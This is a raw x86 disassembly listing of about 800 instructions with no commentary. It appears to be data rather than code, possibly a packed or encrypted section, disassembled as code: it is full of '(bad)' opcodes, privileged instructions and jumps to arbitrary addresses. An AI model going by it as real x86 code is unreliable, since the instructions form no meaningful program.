  40d25b:	(bad)  
  40d25c:	jmp    0x85ea4987
  40d261:	sti    
  40d262:	push   edx
  40d263:	mov    esp,0x3930f751
  40d268:	fisub  DWORD PTR [ebp-0x2d05eadd]
  40d26e:	fldenv [edx]
  40d270:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d272:	push   esp
  40d273:	push   es
  40d274:	or     BYTE PTR [ecx+0x508ee58a],cl
  40d27a:	pop    ds
  40d27b:	jmp    0x6121f47b
  40d280:	les    ecx,FWORD PTR [ebp-0x902b466]
  40d286:	add    eax,0x14205cff
  40d28b:	std    
  40d28c:	dec    ecx
  40d28d:	imul   esi,ecx,0xffffffe8
  40d290:	pop    ebp
  40d291:	call   0x9b34aff4
  40d296:	sahf   
  40d297:	dec    edx
  40d298:	push   0xffffffc6
  40d29a:	jge    0x40d309
  40d29c:	call   0x2902:0xb8ad15fc
  40d2a3:	(bad)  
  40d2a4:	xor    al,0x2e
  40d2a6:	ins    DWORD PTR es:[edi],dx
  40d2a7:	push   esp
  40d2a8:	push   ds
  40d2a9:	push   0x39
  40d2ab:	es cmp al,0xff
  40d2ae:	lods   eax,DWORD PTR ds:[esi]
  40d2af:	mov    ebx,0xbd320eec
  40d2b4:	int3   
  40d2b5:	inc    edi
  40d2b6:	jns    0x40d2fe
  40d2b8:	adc    BYTE PTR [eax-0x2c],dl
  40d2bb:	jge    0x40d2c7
  40d2bd:	or     al,0x97
  40d2bf:	pop    edx
  40d2c0:	inc    ecx
  40d2c1:	ror    BYTE PTR [ecx+0x20],0x40
  40d2c5:	xchg   ecx,eax
  40d2c6:	jmp    0x4a97:0xdbd33505
  40d2cd:	xor    DWORD PTR ds:0xa1bc7493,ebp
  40d2d3:	inc    bx
  40d2d5:	push   es
  40d2d6:	xchg   ebx,eax
  40d2d7:	xor    bl,BYTE PTR [esi]
  40d2d9:	lahf   
  40d2da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2db:	xchg   edx,eax
  40d2dc:	fldcw  WORD PTR [eax-0x3]
  40d2df:	push   ss
  40d2e0:	out    0x37,eax
  40d2e2:	mov    ecx,0x4565f63f
  40d2e7:	xor    dl,BYTE PTR [ebx+0x44eaf2db]
  40d2ed:	icebp  
  40d2ee:	call   0xeb8b:0xac7a7dea
  40d2f5:	add    al,0xdf
  40d2f7:	shr    DWORD PTR [edx-0x6400b4d6],cl
  40d2fd:	cli    
  40d2fe:	and    bh,BYTE PTR [ecx-0xf]
  40d301:	shl    ecx,cl
  40d303:	neg    bl
  40d305:	jnp    0x40d2e2
  40d307:	in     al,dx
  40d308:	inc    edx
  40d309:	mov    ebx,0xe8fcaf4
  40d30e:	push   0x7613e765
  40d313:	push   ecx
  40d314:	xchg   ecx,eax
  40d315:	mov    ds:0xdad593f,eax
  40d31a:	push   ebp
  40d31b:	adc    eax,0x3d175ddc
  40d320:	ficom  WORD PTR [edx]
  40d322:	mov    ebx,0xb000424a
  40d327:	jns    0x40d2bb
  40d329:	lods   al,BYTE PTR ds:[esi]
  40d32a:	jl     0x40d353
  40d32c:	mul    BYTE PTR [eax+0x35]
  40d32f:	push   esp
  40d330:	hlt    
  40d331:	leave  
  40d332:	jbe    0x40d35f
  40d334:	dec    ebx
  40d335:	mov    ds:0x181595a0,al
  40d33a:	fnstsw WORD PTR [ecx-0x6779b76]
  40d340:	add    BYTE PTR [edi+0x29],ah
  40d343:	cld    
  40d344:	cmp    BYTE PTR [ebx],bh
  40d346:	test   eax,0x8946b48c
  40d34b:	xchg   edi,eax
  40d34c:	ja     0x40d3c8
  40d34e:	gs js  0x40d310
  40d351:	test   al,0xb1
  40d353:	or     eax,0x5a65f71a
  40d358:	xchg   DWORD PTR [ecx-0x29],ebx
  40d35b:	xchg   ecx,eax
  40d35c:	fiadd  DWORD PTR [edi+ebx*8+0x157e3e5e]
  40d363:	fyl2xp1 
  40d365:	sbb    al,0xc1
  40d367:	add    BYTE PTR [ebx-0x38],al
  40d36a:	shl    ch,cl
  40d36c:	ins    BYTE PTR es:[edi],dx
  40d36d:	xor    DWORD PTR [ebp*8-0x38a4218c],eax
  40d374:	js     0x40d343
  40d376:	push   edx
  40d377:	gs loope 0x40d30b
  40d37a:	mov    ch,0xb3
  40d37c:	pop    ds
  40d37d:	mov    ds:0xdf050bbc,al
  40d382:	sub    ebx,DWORD PTR [ebx-0x3f]
  40d385:	xchg   BYTE PTR [ebx-0x67af2bb5],dh
  40d38b:	sbb    esi,edx
  40d38d:	sub    edi,DWORD PTR [edx+eiz*2+0x51]
  40d391:	mov    al,ds:0x7fc7c19b
  40d396:	outs   dx,BYTE PTR ds:[esi]
  40d397:	in     al,dx
  40d398:	xor    DWORD PTR [esi-0x3834f00f],ebx
  40d39e:	test   edi,0x86837aa4
  40d3a4:	int    0x63
  40d3a6:	pop    ds
  40d3a7:	mov    ds:0x160af821,eax
  40d3ac:	lock cmp bl,ah
  40d3af:	int3   
  40d3b0:	mov    eax,ds:0xa7cd443b
  40d3b5:	mov    cs,WORD PTR [edi-0x2ab26d0a]
  40d3bb:	fcom   QWORD PTR [ebp-0x26]
  40d3be:	cmp    eax,0x8abbebe1
  40d3c3:	ror    DWORD PTR [esi-0x6cec6d73],1
  40d3c9:	or     al,0x99
  40d3cb:	in     al,0x56
  40d3cd:	sub    esp,DWORD PTR [edx+0x3bf636ec]
  40d3d3:	and    al,BYTE PTR [edi+0x6d]
  40d3d6:	sahf   
  40d3d7:	xchg   BYTE PTR [ecx],bl
  40d3d9:	stos   BYTE PTR es:[edi],al
  40d3da:	(bad)  
  40d3db:	mov    es,esi
  40d3dd:	and    ah,BYTE PTR [ecx]
  40d3df:	ss dec ebx
  40d3e1:	ins    DWORD PTR es:[edi],dx
  40d3e2:	jno    0x40d3f2
  40d3e4:	rol    DWORD PTR [esi-0x7c],0xa9
  40d3e8:	ret    
  40d3e9:	daa    
  40d3ea:	lock nop
  40d3ec:	add    eax,DWORD PTR [ecx-0x43f7b86b]
  40d3f2:	add    eax,0xa82580e3
  40d3f7:	aaa    
  40d3f8:	scas   al,BYTE PTR es:[edi]
  40d3f9:	fsubr  DWORD PTR [esi+0x3c4ccabe]
  40d3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d400:	xor    DWORD PTR [esi-0x1c],0x50
  40d404:	xlat   BYTE PTR ds:[ebx]
  40d405:	das    
  40d406:	mov    bh,0x3
  40d408:	ret    
  40d409:	call   0x9145:0x73d3b334
  40d410:	and    dh,BYTE PTR [ebx+eiz*4-0x45]
  40d414:	mov    DWORD PTR [ebp-0x279dca3b],edi
  40d41a:	push   eax
  40d41b:	adc    ebx,DWORD PTR [eax-0x4c2f6d57]
  40d421:	loopne 0x40d47c
  40d423:	les    edi,FWORD PTR [eax-0x210968a]
  40d429:	ret    
  40d42a:	mov    ecx,0xcdbe5516
  40d42f:	ror    BYTE PTR [ebx-0x4538ec49],0xaa
  40d436:	or     BYTE PTR [ebx+0x5f963ad7],0x1c
  40d43d:	xor    ch,BYTE PTR [ecx]
  40d43f:	addr16 loope 0x40d3e7
  40d442:	mov    bh,0xe9
  40d444:	jae    0x40d429
  40d446:	and    edi,esi
  40d448:	push   edi
  40d449:	sub    eax,0x781d8403
  40d44e:	pusha  
  40d44f:	call   0xba59746a
  40d454:	push   ebp
  40d455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d456:	sbb    ah,BYTE PTR [esp+ecx*2-0x1e]
  40d45a:	retf   0xf035
  40d45d:	frstor [esi]
  40d45f:	out    0x4a,eax
  40d461:	push   ss
  40d462:	cmp    BYTE PTR [edi+0x76efbf43],ah
  40d468:	and    eax,0x9b709b24
  40d46d:	sbb    eax,0xbc74220e
  40d472:	hlt    
  40d473:	or     al,0xcb
  40d475:	fwait
  40d476:	xchg   ecx,eax
  40d477:	cli    
  40d478:	fistp  DWORD PTR [ebp-0x268d3cb9]
  40d47e:	inc    edi
  40d47f:	lea    ebp,[eax+0x5bcb515a]
  40d485:	mov    ds:0x3636a684,eax
  40d48a:	pop    ds
  40d48b:	(bad)  
  40d48c:	(bad)  
  40d48d:	xlat   BYTE PTR ds:[ebx]
  40d48e:	push   ebp
  40d48f:	stos   DWORD PTR es:[edi],eax
  40d490:	addr16 pop es
  40d492:	add    eax,0x452160f1
  40d497:	(bad)  
  40d498:	mov    esp,0x3437583d
  40d49d:	xchg   esi,eax
  40d49e:	int    0xc3
  40d4a0:	cwde   
  40d4a1:	xor    DWORD PTR [esp+eax*1],ecx
  40d4a4:	mov    eax,ds:0x96de0c99
  40d4a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4aa:	(bad)  
  40d4ab:	shl    BYTE PTR [esi],cl
  40d4ad:	loope  0x40d466
  40d4af:	add    DWORD PTR [eax+0x5c],0x545c96a0
  40d4b6:	mov    eax,0xd1a43b89
  40d4bb:	ins    DWORD PTR es:[edi],dx
  40d4bc:	and    DWORD PTR [ecx-0x49],ebp
  40d4bf:	mov    edx,0xff3e4cd7
  40d4c4:	stos   DWORD PTR es:[edi],eax
  40d4c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4c6:	mov    ds:0xb93a925c,eax
  40d4cb:	leave  
  40d4cc:	xor    dl,BYTE PTR [ebx-0x1e63614b]
  40d4d2:	sbb    bh,BYTE PTR [esi]
  40d4d4:	pop    edx
  40d4d5:	out    dx,eax
  40d4d6:	jbe    0x40d4fb
  40d4d8:	outs   dx,BYTE PTR ds:[esi]
  40d4d9:	xchg   ebx,eax
  40d4da:	xor    edi,ecx
  40d4dc:	addr16 in eax,0x18
  40d4df:	mov    eax,ds:0x13a40c16
  40d4e4:	(bad)  
  40d4e5:	nop
  40d4e6:	dec    ecx
  40d4e7:	add    DWORD PTR [edx+0x3e],esp
  40d4ea:	mov    bl,ah
  40d4ec:	out    0x2e,al
  40d4ee:	es push esi
  40d4f0:	inc    ebp
  40d4f1:	(bad)  [edi+eax*8]
  40d4f4:	mov    ds:0xfa1ba70c,eax
  40d4f9:	add    edi,edi
  40d4fb:	enter  0x7319,0x98
  40d4ff:	or     al,0x2c
  40d501:	mov    ds:0x39663d49,eax
  40d506:	aas    
  40d507:	aad    0x8f
  40d509:	test   esi,edx
  40d50b:	movd   DWORD PTR [ebp+0x7b],mm2
  40d50f:	fcomp  DWORD PTR [esi+0x2236e7c0]
  40d515:	lea    eax,[edi+0x68]
  40d518:	outs   dx,BYTE PTR ds:[esi]
  40d519:	pop    esp
  40d51a:	sbb    BYTE PTR [edx-0x14846fc2],dh
  40d520:	int    0x3c
  40d522:	sub    al,0xfd
  40d524:	fisttp DWORD PTR [edx-0x74]
  40d527:	inc    esi
  40d528:	imul   ecx,DWORD PTR [ecx-0x59],0xae5a418a
  40d52f:	sub    al,0xc7
  40d531:	leave  
  40d532:	retf   0x1c01
  40d535:	fisttp DWORD PTR [ebp-0x13]
  40d538:	into   
  40d539:	mov    cl,0x2f
  40d53b:	call   0x8746:0x2e0a5a0e
  40d542:	mov    ch,0x9
  40d544:	ret    
  40d545:	pusha  
  40d546:	pop    ss
  40d547:	jecxz  0x40d588
  40d549:	out    0xa8,al
  40d54b:	xchg   ebp,eax
  40d54c:	mov    esp,0x65a925ed
  40d551:	inc    esi
  40d552:	int3   
  40d553:	lods   al,BYTE PTR ds:[esi]
  40d554:	stos   DWORD PTR es:[edi],eax
  40d555:	xor    ebx,0x79f97a51
  40d55b:	push   eax
  40d55c:	fsub   st(1),st
  40d55e:	shl    BYTE PTR [eax+0x2b],1
  40d561:	push   0xf616f059
  40d566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d567:	rol    DWORD PTR [edx+0x6b97a449],0xe6
  40d56e:	cwde   
  40d56f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d570:	mov    al,0x45
  40d572:	mov    dh,0xd7
  40d574:	jmp    FWORD PTR [ecx+0x1f4cc939]
  40d57a:	mov    esp,0xfbc89213
  40d57f:	fucompp 
  40d581:	(bad)  
  40d582:	in     eax,dx
  40d583:	call   0xe4c05eb0
  40d588:	addr16 or esp,edi
  40d58b:	inc    edx
  40d58c:	data16 adc al,0xfe
  40d58f:	and    ah,BYTE PTR [ebx-0x38]
  40d592:	xlat   BYTE PTR ds:[ebx]
  40d593:	mov    DWORD PTR [ecx+0x6e],esp
  40d596:	mov    edi,0x4e5570d9
  40d59b:	mov    ebx,0x36770eff
  40d5a0:	or     eax,0xf746a272
  40d5a5:	test   BYTE PTR [edx-0x6c],dl
  40d5a8:	lea    edx,[edx+0x1ddda510]
  40d5ae:	xchg   BYTE PTR [esi],ch
  40d5b0:	int3   
  40d5b1:	retf   
  40d5b2:	cmp    BYTE PTR [ebp+0x39],bl
  40d5b5:	pushf  
  40d5b6:	dec    ebp
  40d5b7:	fdivr  DWORD PTR [esi-0x11]
  40d5ba:	jmp    DWORD PTR [edx-0x2ce92488]
  40d5c0:	outs   dx,BYTE PTR ds:[esi]
  40d5c1:	push   ebx
  40d5c2:	cmc    
  40d5c3:	or     si,WORD PTR [edx-0x73f2fe5]
  40d5ca:	mov    dh,0xc2
  40d5cc:	push   edx
  40d5cd:	jb     0x40d61c
  40d5cf:	push   cs
  40d5d0:	mov    al,ds:0xc212ab23
  40d5d5:	dec    edi
  40d5d6:	js     0x40d656
  40d5d8:	fidivr WORD PTR [ebx]
  40d5da:	add    bh,cl
  40d5dc:	mov    eax,ds:0xf547aa19
  40d5e1:	cli    
  40d5e2:	(bad)  
  40d5e3:	adc    al,0xf7
  40d5e5:	lds    esp,FWORD PTR [esi+0x4b7f94f0]
  40d5eb:	xchg   dl,cl
  40d5ed:	xor    ch,ch
  40d5ef:	adc    eax,0xd43375b9
  40d5f4:	and    BYTE PTR [eax-0x49],0xcd
  40d5f8:	add    DWORD PTR [ebx+0x1b8ba7b2],0x17ddd231
  40d602:	sbb    DWORD PTR ds:0x5f7a97c6,esp
  40d608:	xchg   edx,eax
  40d609:	push   ss
  40d60a:	dec    esi
  40d60b:	shl    DWORD PTR [edi+0x53],1
  40d60e:	jecxz  0x40d598
  40d610:	repz adc al,0x33
  40d613:	int3   
  40d614:	xchg   DWORD PTR [ebp+eiz*4-0x24cab68d],edi
  40d61b:	xor    edi,ecx
  40d61d:	cs inc edi
  40d61f:	sub    esp,DWORD PTR [esi-0x50aa0177]
  40d625:	sub    eax,0x41c483a4
  40d62a:	mov    ebx,0x922fcecf
  40d62f:	xor    al,0xa7
  40d631:	aaa    
  40d632:	stc    
  40d633:	push   ebx
  40d634:	jle    0x40d606
  40d636:	sbb    al,0xb6
  40d638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d639:	or     DWORD PTR [eax],0x1d157155
  40d63f:	lahf   
  40d640:	mov    ds:0x2bf78f38,eax
  40d645:	push   0x95bcdc7f
  40d64a:	push   0xd0d44d1b
  40d64f:	xchg   ebx,eax
  40d650:	inc    ebx
  40d651:	mov    cl,0x86
  40d653:	mov    DWORD PTR [ebp-0xa],edx
  40d656:	fistp  QWORD PTR [ebx]
  40d658:	cdq    
  40d659:	and    DWORD PTR [ebx+0x581299ab],esp
  40d65f:	xchg   edx,eax
  40d660:	daa    
  40d661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d662:	sbb    eax,0xe5223846
  40d667:	das    
  40d668:	loopne 0x40d69f
  40d66a:	mov    ds:0x6e662fd5,eax
  40d66f:	push   eax
  40d670:	jno    0x40d6db
  40d672:	or     bh,ch
  40d674:	out    dx,al
  40d675:	mov    BYTE PTR [ebp-0x44],dh
  40d678:	loope  0x40d62d
  40d67a:	xor    BYTE PTR ds:0xea7cb88c,ah
  40d680:	inc    ebp
  40d681:	inc    ebp
  40d682:	js     0x40d6d0
  40d684:	in     eax,dx
  40d685:	clc    
  40d686:	adc    BYTE PTR [ecx-0x4f624d07],dl
  40d68c:	shl    DWORD PTR [eax-0x338b58cc],1
  40d692:	push   edi
  40d693:	out    dx,eax
  40d694:	jge    0x40d6bc
  40d696:	inc    ebx
  40d697:	xchg   ebp,eax
  40d698:	mov    dl,0x3e
  40d69a:	nop
  40d69b:	in     al,dx
  40d69c:	test   BYTE PTR [esi],bh
  40d69e:	lds    edx,FWORD PTR [edi+0x76]
  40d6a1:	cmp    eax,0x4f7a83c0
  40d6a6:	(bad)  
  40d6a8:	xchg   ecx,edx
  40d6aa:	ret    
  40d6ab:	pop    ds
  40d6ac:	gs aaa 
  40d6ae:	jmp    0x96924098
  40d6b3:	push   DWORD PTR [esp+ebp*8+0x78b661ef]
  40d6ba:	imul   ebp,DWORD PTR [edi],0xffffffa4
  40d6bd:	js     0x40d653
  40d6bf:	mov    cl,0xe4
  40d6c1:	aaa    
  40d6c2:	sti    
  40d6c3:	dec    edi
  40d6c4:	enter  0xbd39,0x5f
  40d6c8:	pop    esi
  40d6c9:	inc    ebx
  40d6ca:	aad    0xdb
  40d6cc:	jno    0x40d6aa
  40d6ce:	int3   
  40d6cf:	stc    
  40d6d0:	cmp    DWORD PTR [eax-0x24],0xc4e24326
  40d6d7:	mov    edx,0x7784a2c5
  40d6dc:	add    ch,0x8a
  40d6df:	mov    edi,0xd4836f73
  40d6e4:	push   0x17b131c7
  40d6e9:	test   DWORD PTR [ecx-0x7eee20b1],ecx
  40d6ef:	mov    edi,0xb9adef1d
  40d6f4:	xchg   ebx,eax
  40d6f5:	push   esp
  40d6f6:	ret    
  40d6f7:	xchg   ebx,eax
  40d6f8:	pop    ebp
  40d6f9:	xlat   BYTE PTR ds:[ebx]
  40d6fa:	pop    eax
  40d6fb:	add    al,0xe0
  40d6fd:	test   BYTE PTR [edx+0xf58c336],dl
  40d703:	mov    cl,0xe7
  40d705:	loop   0x40d68a
  40d707:	push   eax
  40d708:	lock jmp 0xb163a85d
  40d70e:	push   es
  40d70f:	jmp    0x14afa50
  40d714:	push   ebp
  40d715:	pop    edi
  40d716:	sar    DWORD PTR [eax],1
  40d718:	lea    ecx,[ebp-0x4c]
  40d71b:	nop
  40d71c:	cmp    ch,BYTE PTR [ecx]
  40d71e:	mov    ?,WORD PTR [ecx+0x12b6021c]
  40d724:	push   0x2335bcfb
  40d729:	dec    ecx
  40d72a:	repnz fild DWORD PTR [eax+0x2e23d509]
  40d731:	jne    0x40d6f5
  40d733:	lock out 0x5,al
  40d736:	inc    eax
  40d737:	pop    esi
  40d738:	add    ch,BYTE PTR [ecx+0x34]
  40d73b:	dec    esi
  40d73c:	jp     0x40d6db
  40d73e:	in     eax,0x86
  40d740:	rcr    DWORD PTR [esi-0x171aabca],0x18
  40d747:	mov    bl,0xf0
  40d749:	addr16 mov edi,eax
  40d74c:	inc    ebp
  40d74d:	sbb    BYTE PTR ds:0x867ecf0a,bl
  40d753:	mov    dl,BYTE PTR [ebx+edx*2]
  40d756:	add    eax,0x8c1cd740
  40d75b:	cs inc esp
  40d75d:	rcr    DWORD PTR [edx],1
  40d75f:	aam    0xc
  40d761:	push   ebx
  40d762:	into   
  40d763:	xor    al,BYTE PTR [ebp+0x44]
  40d766:	(bad)  
  40d767:	mov    ecx,0xa715d09f
  40d76c:	mov    ds:0xc157c57c,al
  40d772:	clts   
  40d774:	(bad)  
  40d775:	adc    bl,dh
  40d777:	add    eax,0xae808ee5
  40d77c:	stos   DWORD PTR es:[edi],eax
  40d77d:	(bad)  
  40d77e:	aam    0x3e
  40d780:	rcl    BYTE PTR [esi+edi*4],cl
  40d783:	sub    DWORD PTR [edi+0x41],ecx
  40d786:	xor    al,0x78
  40d788:	adc    ch,BYTE PTR [edi+eiz*1]
  40d78b:	mov    bl,0xcc
  40d78e:	aas    
  40d78f:	xchg   BYTE PTR [eax],ah
  40d791:	call   0xe9eb7a6d
  40d796:	adc    al,0xf2
  40d798:	imul   eax,DWORD PTR [edx],0x4cf61ba5
  40d79e:	pop    es
  40d79f:	repz in al,0x56
  40d7a2:	dec    ebx
  40d7a3:	icebp  
  40d7a4:	cld    
  40d7a5:	mov    bh,0xc0
  40d7a7:	push   eax
  40d7a8:	mov    al,ds:0x11c823f9
  40d7ad:	inc    ecx
  40d7ae:	sbb    eax,0x12636079
  40d7b3:	(bad)
  40d7b7:	out    dx,eax
  40d7b8:	push   edi
  40d7b9:	mov    al,0xfb
  40d7bb:	fiadd  DWORD PTR [eax]
  40d7bd:	adc    edx,DWORD PTR [eax-0x80]
  40d7c0:	out    dx,eax
  40d7c1:	or     eax,edx
  40d7c3:	adc    ch,ch
  40d7c5:	retf   
  40d7c6:	cmp    al,0xe7
  40d7c8:	test   al,0x8f
  40d7ca:	pop    ss
  40d7cb:	pop    edx
  40d7cc:	jmp    0x6f504a9e
  40d7d1:	add    ebx,esp
  40d7d3:	jns    0x40d7ba
  40d7d5:	add    al,0xb6
  40d7d7:	jne    0x40d781
  40d7d9:	or     bl,ch
  40d7db:	push   edi
  40d7dc:	xchg   edi,eax
  40d7dd:	out    0x5,al
  40d7df:	cld    
  40d7e0:	mov    cl,BYTE PTR [edx-0x27]
  40d7e3:	adc    al,cl
  40d7e5:	imul   ecx,ecx,0x6beebe33
  40d7eb:	rol    BYTE PTR [edi],0x25
  40d7ee:	retf   
  40d7ef:	xchg   edx,eax
  40d7f0:	fstp   QWORD PTR [ebx+eiz*4+0x1ff2795e]
  40d7f7:	into   
  40d7f8:	pop    edx
  40d7f9:	inc    ecx
  40d7fa:	cdq    
  40d7fb:	pop    ebx
  40d7fc:	jnp    0x40d806
  40d7fe:	(bad)  
  40d7ff:	shr    BYTE PTR [ebx+0x20],cl
  40d802:	jno    0x40d87b
  40d804:	cmp    dh,BYTE PTR [edi+0x13c25b3b]
  40d80a:	mov    ah,0xe
  40d80c:	outs   dx,DWORD PTR ds:[esi]
  40d80d:	and    BYTE PTR [esi-0x72],bl
  40d810:	enter  0xb96b,0x36
  40d814:	ss pop edi
  40d816:	les    esi,FWORD PTR [edx-0x18]
  40d819:	pop    ebp
  40d81a:	(bad)  
  40d81b:	push   ebp
  40d81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d81d:	fisttp QWORD PTR ds:0xae09b97a
  40d823:	sub    al,0xd1
  40d825:	and    BYTE PTR [esi+0x21],cl
  40d828:	cs xor al,0xbf
  40d82b:	out    0xd4,eax
  40d82d:	mov    edx,0x36e89729
  40d832:	nop
  40d833:	and    esp,DWORD PTR [eax+edi*2-0x38]
  40d837:	(bad)  
  40d838:	jmp    0x40d881
  40d83a:	add    DWORD PTR [ebx],ebx
  40d83c:	call   0x6920:0xe465d8f3
  40d843:	out    0x87,al
  40d845:	jge    0x40d8c2
  40d847:	sbb    DWORD PTR [edi+ecx*1+0x3],0xffffffe1
  40d84c:	gs mov ah,0xc1
  40d84f:	dec    esp
  40d850:	dec    ebx
  40d851:	gs pushf 
  40d853:	mov    eax,ds:0x921fa795
  40d858:	icebp  
  40d859:	nop
  40d85a:	mov    eax,ds:0xe606ba49
  40d85f:	std    
  40d860:	jae    0x40d803
  40d862:	push   cs
  40d863:	mov    ebx,0x14e15ad4
  40d868:	mov    esp,0x5a794076
  40d86d:	(bad)  [ebp+0x57]
  40d870:	fmulp  st(4),st
  40d872:	fs ds lock iret 
  40d876:	mov    DWORD PTR [edx+0x1dc6b616],esp
  40d87c:	retf   0xb8e2
  40d87f:	sbb    DWORD PTR [edi+eiz*1+0x1b146a38],edi
  40d886:	rol    BYTE PTR [edx+edi*8],0x55
  40d88a:	jg     0x40d8dd
  40d88c:	push   0x40224149
  40d891:	or     eax,0x762dbf38
  40d896:	push   eax
  40d897:	ret    
  40d898:	int3   
  40d899:	cmp    al,0x2
  40d89b:	sbb    BYTE PTR [ecx],dh
  40d89d:	cld    
  40d89e:	retf   
  40d89f:	dec    edx
  40d8a0:	and    dh,BYTE PTR [esi+ecx*2]
  40d8a3:	and    al,0x4b
  40d8a5:	cmovne ecx,DWORD PTR ds:0xc9071c8c
  40d8ac:	cmp    dl,BYTE PTR [ebp+0x6eac0dfd]
  40d8b2:	nop
  40d8b3:	mov    dl,0xf3
  40d8b5:	scas   al,BYTE PTR es:[edi]
  40d8b6:	lahf   
  40d8b7:	mov    esi,0xe3f243b3
  40d8bc:	xor    ch,BYTE PTR [eax]
  40d8be:	push   0xffffffae
  40d8c0:	sar    DWORD PTR [edx+edx*8+0xe030da8],cl
  40d8c7:	inc    edi
  40d8c8:	jg     0x40d882
  40d8ca:	inc    ebp
  40d8cb:	mov    ebx,0xb2da8704
  40d8d0:	cs mov dh,al
  40d8d3:	add    dl,BYTE PTR [ebp-0x716e00d0]
  40d8d9:	pusha  
  40d8da:	sub    dh,al
  40d8dc:	mov    bh,0xe4
  40d8de:	leave  
  40d8df:	repz sbb DWORD PTR [ebp-0xb9a598],edx
  40d8e6:	fs xchg ebx,eax
  40d8e8:	leave  
  40d8e9:	adc    al,0xe9
  40d8eb:	scas   eax,DWORD PTR es:[edi]
  40d8ec:	xor    cl,ah
  40d8ee:	call   0x4a49:0x27f191f0
  40d8f5:	pop    ds
  40d8f6:	(bad)  
  40d8f7:	retf   
  40d8f8:	inc    ebx
  40d8f9:	daa    
  40d8fa:	jae    0x40d8cd
  40d8fc:	dec    ecx
  40d8fd:	add    al,0x5d
  40d8ff:	ins    DWORD PTR es:[edi],dx
  40d900:	cmp    edi,DWORD PTR [ebx+ecx*1]
  40d903:	sti    
  40d904:	pop    eax
  40d905:	pop    eax
  40d906:	adc    DWORD PTR [edi-0x60d69d37],ebp
  40d90c:	inc    ebx
  40d90d:	and    esi,edx
  40d90f:	std    
  40d910:	push   cs
  40d911:	sahf   
  40d912:	iret   
  40d913:	jae    0x40d8b4
  40d915:	jl     0x40d98f
  40d917:	mov    al,ds:0x7a3a25fc
  40d91c:	add    bh,BYTE PTR [ebx-0x51cbbc16]
  40d922:	cli    
  40d923:	mov    al,0x68
  40d925:	rcr    DWORD PTR [eax+0x645438cb],0xf8
  40d92c:	in     eax,0xd0
  40d92e:	mov    al,ds:0x4ba96656
  40d933:	ret    0xd76f
  40d936:	push   cs
  40d937:	xchg   edx,eax
  40d938:	fmul   DWORD PTR [edx-0x6d]
  40d93b:	xchg   ecx,eax
  40d93c:	repz sbb ah,ch
  40d93f:	out    dx,eax
  40d940:	mov    ds:0x2a54b515,al
  40d945:	and    dh,BYTE PTR [ebx]
  40d947:	sbb    al,0x7d
  40d949:	inc    eax
  40d94a:	out    0x1b,al
  40d94c:	jge    0x40d8d3
  40d94e:	xor    al,0x7d
  40d951:	data16 cmp dl,al
  40d954:	ja     0x40d9a2
  40d956:	retf   0x10fc
  40d959:	ret    0xc731
  40d95c:	and    DWORD PTR [edx+ecx*4+0x8],edx
  40d960:	xchg   DWORD PTR [esi+0x27],esi
  40d963:	je     0x40d93d
  40d965:	cmp    eax,0x41c46f
  40d96a:	push   0x5b
  40d96c:	aaa    
  40d96d:	stc    
  40d96e:	push   ebp
  40d96f:	retf   0xe84e
  40d972:	mov    dh,0xf7
  40d974:	xor    ebx,edx
  40d976:	mov    eax,0x9e7b0f03
  40d97b:	loope  0x40d98b
  40d97d:	sub    al,BYTE PTR [edx]
  40d97f:	lea    esi,[edx]
  40d981:	ss mov edi,0x7ebe252d
  40d987:	clc    
  40d988:	dec    ecx
  40d989:	lods   al,BYTE PTR ds:[esi]
  40d98a:	das    
  40d98b:	sar    BYTE PTR [eax+0x28],1
  40d98e:	and    DWORD PTR [ebx-0x6e],edi
  40d991:	js     0x40d9c8
  40d993:	mov    ds:0x7bba6cb3,al
  40d998:	push   eax
  40d999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d99a:	add    DWORD PTR [edi-0x11],0x7ffeadae
  40d9a1:	out    0xef,eax
  40d9a3:	enter  0xc95a,0xd7
  40d9a7:	fbld   TBYTE PTR [ecx+0x6fb0c228]
  40d9ad:	arpl   WORD PTR [edx],cx
  40d9af:	test   bh,al
  40d9b1:	xsave  [esi+0x1d]
  40d9b5:	and    edi,ebp
  40d9b7:	mov    bh,0xf9
  40d9b9:	enter  0x8702,0x22
  40d9bd:	mov    eax,0xfe2fafc7
  40d9c2:	mov    BYTE PTR [eax+0x42b65dfa],bl
  40d9c8:	fcompp 
  40d9cb:	adc    eax,0x14b90989
  40d9d0:	and    ebp,DWORD PTR [edi]
  40d9d2:	jbe    0x40da37
  40d9d4:	data16 sbb al,0x4c
  40d9d7:	popa   
  40d9d8:	push   edx
  40d9d9:	cmp    bh,cl
  40d9db:	and    eax,0xdf413ec1
  40d9e0:	and    DWORD PTR ds:0x3e18063d,eax
  40d9e6:	inc    ecx
  40d9e7:	add    eax,0xe792657d
  40d9ec:	sub    DWORD PTR [ecx+0x6e],0x1c02487c
  40d9f3:	sbb    BYTE PTR [ecx-0x31475c5],ch
  40d9f9:	fnstcw WORD PTR [edi+0x604fd13e]
  40d9ff:	fcom   DWORD PTR [eax+0x7c]
  40da02:	or     BYTE PTR [edi-0x7df1988b],al
  40da08:	cmp    ebx,edi
  40da0a:	mov    eax,ds:0x25beac81
  40da0f:	dec    esi
  40da10:	mov    edi,0xb8058d68
  40da15:	add    eax,0xa07a6de6
  40da1a:	and    bl,BYTE PTR [ebp-0x3]
  40da1d:	cmp    bl,bl
  40da1f:	imul   esi,DWORD PTR [esi+0x19e9bc13],0x736cc54f
  40da29:	das    
  40da2a:	xor    BYTE PTR [ecx-0x73],0x48
  40da2e:	sti    
  40da2f:	fsub   QWORD PTR [edi]
  40da31:	jecxz  0x40daaa
  40da33:	ins    BYTE PTR es:[edi],dx
  40da34:	test   BYTE PTR [edi-0x29],dl
  40da37:	in     al,dx
  40da38:	pop    esp
  40da39:	imul   ecx,DWORD PTR [ebp+eiz*8+0x1d39453e],0x36
  40da41:	or     BYTE PTR [esi],ah
  40da43:	lahf   
